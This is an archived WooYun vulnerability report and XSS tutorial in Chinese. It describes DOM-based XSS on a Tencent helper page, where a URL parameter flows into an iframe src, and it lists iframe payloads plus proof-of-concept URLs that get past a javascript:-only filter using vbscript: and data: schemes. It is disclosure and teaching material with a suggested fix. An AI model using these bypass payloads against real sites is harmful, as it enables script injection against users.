{"id": 14806, "wybug_id": "wooyun-2012-016223", "wybug_title": "[腾讯实例教程] 那些年我们一起学XSS - 11. Dom Xss进阶 [善变iframe]", "wybug_corp": "腾讯", "wybug_author": "心伤的瘦子", "wybug_date": "2012-12-19 15:52", "wybug_open_date": "2013-02-02 15:53", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "2", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-02：\t细节向公众公开  简要描述： 有时候，输出还会出现在 <iframe src=\"[输出]\"></iframe> 。 iframe 的 src属性本来应该是一个网址，但是iframe之善变，使得它同样可以执行javascript，而且可以用不同的姿势来执行。这一类问题，我将其归为[路径可控]问题。当然上面说到的是普通的反射型XSS。有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src=\"[可控的url]\"; 同样会导致XSS问题，来看看本例吧～ 详细说明：  1. 先来说说iframe的变化。1.1 最好懂的，onload执行js<iframe onload=\"alert(1)\"></iframe>1.2 src 执行javascript代码<iframe src=\"javascript:alert(1)\"></iframe>1.3 IE下vbscript执行代码<iframe src=\"vbscript:msgbox(1)\"></iframe>  1.4 Chrome下data协议执行代码<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe> Chrome1.5 上面的变体<iframe src=\"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>1.6 Chrome下srcdoc属性<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>2. 有兴趣的，可以一个一个的去测试上面的效果，注意浏览器的特异性哦。3. 接着我们来看看具体的例子。\nhttp://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&gid=yl&cid=68&from=\n4. 我们先开调试工具，看看有没有可见的输出。\n\n可以看到，我们参数的aaaaaa被带入到了<iframe src=\"这里\"></iframe>。这样一来，就满足了我们的使用条件。我们试试\nhttp://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);&gid=yl&cid=68&from=\n。。竟然没反应。我们来看看刚才的那个地方。\n\n可以看到，src这次没属性了，看来腾讯做了什么过滤。我们继续搜索下一个toolframe试试。恩，看来就是这段代码导致的。\n\n一起看看这段代码。\nfunction OpenFrame(url) {\tif (url.toLowerCase().indexOf('http://') != '-1' || url.toLowerCase().indexOf('https://') != '-1' || url.toLowerCase().indexOf('javascript:') != '-1') return false;\tdocument.getElementById(\"toolframe\").src = url;}\n不难看出，腾讯对 javascript:做出了判断。\ndocument.getElementById(\"toolframe\").src = url;\n这句是导致XSS的一句代码。而openFrame的url参数则来自于(无关代码省略)：\n...var tool_url = getQueryStringValue(\"turl\");...openFrame(tool_url);...\n5. 根据我们上面说道的iframe的利用方法，我们不难看出，腾讯的过滤是不完善的。在IE下，我们可以使用vbscript来执行代码。 vbscript里 ' 单引号表示注释，类似JS里的//\nhttp://helper.qq.com/appweb/tools/tool-detail.shtml?turl=vbscript:msgbox(1)'&gid=yl&cid=68&from=\n\n\n在chrome下，我们可以用data协议来执行JS。\nhttp://helper.qq.com/appweb/tools/tool-detail.shtml?turl=data:text/html,<script>alert(1)</script>'&gid=yl&cid=68&from=\n\n\n6. 就到这里。   漏洞证明：  见详细说明   修复方案：  危险的不光是javascript:，vbscript:, data: 等同样需要过滤。   版权声明：转载请注明来源 心伤的瘦子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2012-12-19 16:24 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-19 15:58 |    \t\ttxcbg \t\t\t( 普通白帽子  |\t\t\t        Rank:391 漏洞数:53        | 说点什么呢？)\t\t \n  沙发    \n     2012-12-19 17:07 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @心伤的瘦子 老湿呀，俺可喜欢看你的续集啦~标题有文采呀    \n     2012-12-19 17:20 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @se55i0n 谢谢关注。    \n     2012-12-19 18:07 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  。。    \n     2012-12-19 19:55 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  ....为什么每个rank都是5...老湿~~每贴必markk    \n     2012-12-23 23:09 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @dyun ...教程,其实有一个是10,要的5给的10...    \n     2013-01-20 15:53 |    \t\t九九 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | 暂无。)\t\t \n  撸了    \n     2013-02-16 21:06 |    \t\tmole3o \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 学生一枚，青春向上的白帽子。)\t\t \n  学习了！    \n     2014-12-02 14:13 |    \t\t风之传说 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:28        | 借用朋友的一句话，你的时间在哪里，你的成...)\t\t \n  good.    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}